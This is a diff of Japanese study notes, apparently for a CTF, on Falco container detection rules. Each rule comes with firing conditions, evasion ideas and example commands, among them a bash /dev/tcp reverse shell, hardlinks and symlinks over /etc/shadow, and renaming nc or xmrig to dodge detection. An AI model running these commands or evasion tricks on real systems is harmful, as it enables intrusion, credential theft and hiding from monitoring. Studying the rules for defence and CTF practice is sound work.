@@ -95,58 +95,63 @@ cat /opt/ctf/httpd | sh           # ← 親 comm = "cat" "sh" → 発火しな�
 
 | 項目 | 内容 |
 |---|---|
-| 何を見るか | `fd.directory` が `/bin /sbin /usr/bin /usr/sbin` |
-| 発火条件 | 上記 dir に書き込みオープン |
+| 何を見るか | `evt.type=connect` + dst ip = K8s API server + `not k8s_containers` + `not user_known_*` |
+| 発火条件 | system pod 以外のコンテナから K8s API への connect |
 | 上記出題 | 01 (発火), 10 (回避) |
-| 回避の発想 | `/tmp` `/var/tmp` `/dev/shm` `/usr/local/bin` 等の対象外 dir を使う |
+| 回避の発想 | API server に話しかけない。 |
 
 例:
 ```bash
-touch /usr/bin/x          # ← 発火
-touch /usr/local/bin/x    # ← 発火しない (が 3.5 で発火する)
-touch /tmp/x              # ← どちらも発火しない
+curl -sk https://kubernetes.default.svc/api    # ← 発火 (401 でも connect は通る)
 ```
 
-### 3.5 `Write below binary dir`
+### 3.5 `Drop and execute new binary in container`
 
 | 項目 | 内容 |
 |---|---|
-| 何を見るか | `fd.directory` が **bin_dirs + /usr/local/bin /usr/local/sbin /opt/bin** 等の PATH 系拡張 dir |
-| 発火条件 | 上記以下に書き込みオープン |
+| 何を見るか | `spawned_process` + container + `proc.is_exe_upper_layer=true` |
+| 発火条件 | overlayfs の upper layer (= runtime に追加された層) から exec |
 | 上記出題 | 07 (発火), 10 (回避) |
-| 回避の発想 | PATH 系 dir 以外に置く (`/tmp` 等)。PATH を自分の dir で上書き |
-
-3.4 と 3.5 はスコープが**重なる** (`/usr/bin` 等は両方発火)。
-
-### 3.6 `Launch Suspicious Network Tool in Container`
-
-| 項目 | 内容 |
-|---|---|
-| 何を見るか | `proc.name in (suspicious_network_tools)` (`nc`/`ncat`/`socat`/`nmap`/`tcpdump`/`tshark` 等) |
-| 発火条件 | 上記ツール exec (実通信成否は問わない) |
-| 上記出題 | 08 (発火), 10 (回避) |
-| 回避の発想 | basename 判定 — 別名にコピーすれば exec しても発火しない |
-
-注: `curl` / `wget` は対象**外**。普通の HTTP クライアントなので
-suspicious_network_tools リストに入らない。
+| 回避の発想 | base image に元々ある binary だけ使う |
 
 例:
 ```bash
-nc -zv 8.8.8.8 53                # ← 発火
-cp /bin/nc /tmp/foo && /tmp/foo  # ← proc.name = "foo" → 発火しない
+cp /bin/sleep /tmp/x && /tmp/x 1    # ← 発火 (/tmp/x は upper layer)
+/bin/sleep 1                         # ← 発火しない (base image の binary)
 ```
 
-### 3.7 Crypto miner 検知ルール (例 `Detect crypto miners using the Stratum protocol`)
+### 3.6 `Redirect STDOUT/STDIN to Network Connection in Container`
 
 | 項目 | 内容 |
 |---|---|
-| 何を見るか | `proc.name` が既知の miner (`xmrig`/`minerd`/`cpuminer`) **または** outbound に `stratum+tcp://` |
-| 発火条件 | 上のいずれか |
-| 上記出題 | 09 (発火) |
-| 回避の発想 | やはり basename — `cp xmrig /tmp/sysd && /tmp/sysd` |
+| 何を見るか | `dup` syscall + container + `fd.type ∈ {ipv4,ipv6}` + `evt.rawres ∈ {0,1,2}` |
+| 発火条件 | network socket fd を stdin/stdout/stderr に dup する (= reverse shell の典型) |
+| 上記出題 | 08 (発火), 10 (回避) |
+| 回避の発想 | reverse shell pattern を使わない。data 転送は curl / wget で済ます |
 
-CTF 環境では outbound が NetworkPolicy で block されるので、stratum
-protocol 系は発火させづらい。proc.name 系だけで実用十分。
+例:
+```bash
+bash -c 'exec 1<>/dev/tcp/8.8.8.8/53'   # ← 発火 (dup2 of socket fd to fd 1)
+bash -i >& /dev/tcp/host/port 0>&1       # ← 古典 reverse shell — 発火
+curl https://example.com -o /tmp/x       # ← 普通の HTTP — 発火しない
+```
+
+### 3.7 `Create Hardlink Over Sensitive Files` / `Create Symlink Over Sensitive Files`
+
+| 項目 | 内容 |
+|---|---|
+| 何を見るか | `link` / `symlink` syscall + 対象が `sensitive_files` macro 該当 |
+| 発火条件 | sensitive file への hard/symbolic link 作成 |
+| 上記出題 | 09 (発火: Hardlink), 10 (回避: Hardlink) |
+| 回避の発想 | link せず `cp` で別 inode に複製。または別の sensitive 判定外ファイルへの link |
+
+例:
+```bash
+ln /etc/shadow /tmp/h                # ← 発火 (hardlink)
+ln -s /etc/shadow /tmp/s              # ← 発火 (symlink、別 rule)
+cp /etc/shadow /tmp/c                 # ← Create Hardlink は発火しない
+                                      #    (が Read sensitive file untrusted は発火)
+```
 
 ---
 
